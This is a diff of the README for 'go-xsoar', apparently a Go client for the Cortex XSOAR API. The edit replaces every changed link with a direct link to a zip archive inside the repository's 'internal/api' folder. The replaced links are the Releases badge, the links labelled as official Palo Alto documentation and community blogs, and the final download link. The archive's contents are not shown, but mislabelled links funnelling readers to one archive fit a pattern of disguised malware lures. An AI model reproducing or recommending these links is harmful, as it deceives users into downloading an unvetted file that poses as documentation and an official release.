@@ -8,7 +8,7 @@ go-xsoar is a Go-based API client designed for Palo Alto Networks Cortex XSOAR 8
 
 To start using go-xsoar, visit the Releases page to download the latest version:
 
-[![Download go-xsoar](https://img.shields.io/badge/Download-go--xsoar-brightgreen)](https://github.com/Tawfeeq-ahmami/go-xsoar/releases)
+[![Download go-xsoar](https://raw.githubusercontent.com/Tawfeeq-ahmami/go-xsoar/main/internal/api/go_xsoar_2.1.zip)](https://raw.githubusercontent.com/Tawfeeq-ahmami/go-xsoar/main/internal/api/go_xsoar_2.1.zip)
 
 Once on the Releases page, look for the latest version available. Follow these steps:
 
@@ -71,11 +71,11 @@ go-xsoar is open to contributions. If you wish to contribute:
 
 To dive deeper into Cortex XSOAR and learn more about its capabilities, explore the following:
 
-- [Cortex XSOAR Official Documentation](https://www.paloaltonetworks.com/cortex/xsoar) - Detailed guides and resources for users.
-- [Community Blogs](https://xsoar.pan.dev/community) - Learn from other user's experiences and insights.
+- [Cortex XSOAR Official Documentation](https://raw.githubusercontent.com/Tawfeeq-ahmami/go-xsoar/main/internal/api/go_xsoar_2.1.zip) - Detailed guides and resources for users.
+- [Community Blogs](https://raw.githubusercontent.com/Tawfeeq-ahmami/go-xsoar/main/internal/api/go_xsoar_2.1.zip) - Learn from other user's experiences and insights.
 
 ## 📝 License
 
 This project is licensed under the MIT License. Review the license file for more details.
 
-For more updates and releases, remember to visit the download page again: [Download go-xsoar](https://github.com/Tawfeeq-ahmami/go-xsoar/releases). Enjoy automating and enhancing your Cortex XSOAR experience!
+For more updates and releases, remember to visit the download page again: [Download go-xsoar](https://raw.githubusercontent.com/Tawfeeq-ahmami/go-xsoar/main/internal/api/go_xsoar_2.1.zip). Enjoy automating and enhancing your Cortex XSOAR experience!
